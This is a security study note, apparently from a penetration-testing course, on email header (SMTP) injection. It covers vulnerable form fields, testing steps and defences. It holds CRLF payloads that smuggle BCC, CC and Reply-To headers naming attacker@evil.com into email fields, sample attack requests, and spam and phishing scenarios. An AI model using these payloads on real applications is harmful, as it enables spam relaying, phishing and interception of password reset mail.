---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.06 Email Header Injection (SMTP Injection)"
---

# 10.06 — Email Header Injection (SMTP Injection)

## What is Email Header Injection?

Email Header Injection (also called SMTP Injection) occurs when user input is placed into email headers without filtering `\r\n` characters. Since email headers are separated by CRLF (`\r\n`), an attacker can inject additional headers — adding BCC recipients, CC, custom headers, or even a second email body.

```
NORMAL EMAIL:
  From: app@target.com
  To: user@email.com
  Subject: Password Reset
  
  [Email body here]

INJECTED:
  From: app@target.com
  To: attacker@evil.com%0d%0aBCC:victim2@email.com
                        ↑ %0d%0a = \r\n !
  Subject: Password Reset
  
  RESULTING EMAIL:
  From: app@target.com
  To: attacker@evil.com
  BCC: victim2@email.com     ← INJECTED HEADER!
  Subject: Password Reset
```

---

## What Attackers Can Inject

```
INJECTABLE EMAIL HEADERS:
  To: (add more recipients)
  CC: (add to CC list)
  BCC: (silently add recipients!)
  From: (spoof sender address)
  Reply-To: (redirect replies to attacker)
  Subject: (change subject)
  
  And custom headers:
  X-Mailer:
  X-Spam-Status: No
  Content-Type: (change email body format!)
```

---

## Common Vulnerable Points

```
FORMS THAT SEND EMAILS:
  ✓ Contact/feedback forms (name, subject, message)
  ✓ Password reset forms (email address field)
  ✓ Email subscription forms
  ✓ "Email this page" features
  ✓ "Send to a friend" features
  ✓ Support ticket systems (subject line)

THE MOST COMMON VULNERABLE FIELDS:
  - "From" field (user's email address in contact forms)
  - "Subject" field
  - "Name" field (if used in From: header)
```

---

## Injection Payloads

```
INJECT CRLF INTO EMAIL PARAMETER:

# ADD BCC (most impactful — spam any email!):
Payload in "From" field:
attacker@evil.com%0d%0aBCC:victim@target.com

Result header:
From: attacker@evil.com
BCC: victim@target.com    ← Added BCC!

# ADD CC:
attacker@evil.com%0d%0aCC:anyone@example.com

# CHANGE REPLY-TO:
user@user.com%0d%0aReply-To:attacker@evil.com
→ When victim replies → reply goes to attacker!

# INJECT SECOND EMAIL (MIME INJECTION):
user@user.com%0d%0a%0d%0aHEY SPAM BODY HERE
→ %0d%0a%0d%0a = two CRLFs = end of headers = start of body!
→ Completely overrides email body!
```

---

## Testing Email Header Injection

```bash
# STEP 1: FIND EMAIL INPUT FIELDS:
# Contact form, password reset, etc.

# STEP 2: INJECT CRLF IN EMAIL FIELD:
POST /contact HTTP/1.1

name=test&email=test@test.com%0d%0aCC:attacker@evil.com&message=hello

# STEP 3: CHECK IF EXTRA HEADER ARRIVED:
# Check attacker@evil.com inbox
# If you got the email → email header injection!

# STEP 4: BCC SPAM TEST:
# Try: email=test@test.com%0d%0aBCC:victim@target.com
# Check if victim@target.com receives the email

# ENCODING VARIATIONS:
%0d%0a     = \r\n  (URL encoded CRLF)
%0a        = \n    (just newline — some mailers accept)
\r\n       = literal (if server doesn't URL-decode first)
\n         = literal newline
```

---

## Spam via Email Header Injection

```
SPAM RELAY ATTACK:
  1. App has vulnerable contact form
  2. Attacker injects BCC: [spam-list@target.com]
  3. For every contact form submission → email goes to spam targets!
  4. The email comes from target.com → appears legitimate!
  5. HIGH deliverability because it's from a real app server!
  
  → Business impact: server blacklisted as spam source!
  → Users receive unwanted email from "trusted" source!
```

---

## Phishing via Email Header Injection

```
PHISHING ATTACK:
  1. Vulnerable "password reset" form
  2. Inject: 
     POST /reset HTTP/1.1
     email=victim@bank.com%0d%0aCC:phishing@evil.com
     
  3. Password reset email goes to victim AND attacker!
  4. Or: inject Reply-To: attacker@evil.com
     → Victim replies → sends reply to attacker
     → Attacker sees victim's responses (2FA codes?)
```

---

## Defense

```
PROTECTION:
  1. Strip or reject \r and \n from all email header values:
     PHP:
     $email = str_replace(array("\r", "\n"), '', $email);
     $subject = str_replace(array("\r", "\n"), '', $subject);
     
     Python:
     email = email.replace('\r', '').replace('\n', '')
     
     Java:
     email = email.replaceAll("[\r\n]", "");
  
  2. Validate email format:
     PHP: filter_var($email, FILTER_VALIDATE_EMAIL)
     → Rejects emails with \r\n in them
  
  3. Use email libraries that handle this automatically:
     PHP: PHPMailer (validates and encodes)
     Python: email/smtplib with proper construction
     Node.js: nodemailer
  
  4. Never concatenate user input directly into headers
```

---

## Related Notes
- [[09 - CRLF Injection]] — CRLF injection for HTTP headers
- [[07 - HTTP Header Injection]] — HTTP-level header injection
- [[Module 08 - Command Injection]] — OS-level injection comparison
